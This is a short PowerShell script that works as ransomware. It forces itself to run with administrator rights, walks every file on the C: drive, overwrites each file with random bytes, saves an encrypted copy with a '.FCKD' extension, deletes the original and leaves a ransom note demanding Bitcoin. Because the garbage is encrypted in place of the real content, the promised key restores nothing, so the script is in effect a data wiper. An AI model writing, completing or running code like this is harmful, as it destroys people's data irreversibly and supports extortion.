# Force run as admin
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

$key = -join ((33..126) | Get-Random -Count 32 | % {[char]$_})
$files = Get-ChildItem -Path "C:\" -Recurse -File -ErrorAction SilentlyContinue | Sort-Object FullName -Descending
foreach ($file in $files) {
    $content = [System.IO.File]::ReadAllBytes($file.FullName)
    if ($content) {
        # Overwrite with garbage first
        $trash = [byte[]] (1..$content.Length | % {Get-Random -Max 256})
        [System.IO.File]::WriteAllBytes($file.FullName, $trash)
        # Now encrypt
        $aes = New-Object System.Security.Cryptography.AesManaged
        $aes.Key = [Text.Encoding]::ASCII.GetBytes($key.Substring(0,32))
        $aes.IV = $aes.Key[0..15]
        $encryptor = $aes.CreateEncryptor()
        $encrypted = $encryptor.TransformFinalBlock($trash, 0, $trash.Length)
        [System.IO.File]::WriteAllBytes($file.FullName + ".FCKD", $encrypted)
        Remove-Item -Path $file.FullName -ErrorAction SilentlyContinue
    }
}
Set-Content -Path "C:\YOU_ARE_SCREWED.txt" -Value "WOW! Everythingâ€™s gone! Send 1 BTC to 1FakeBitcoinAddress for key: $key or kiss it all goodbye!"
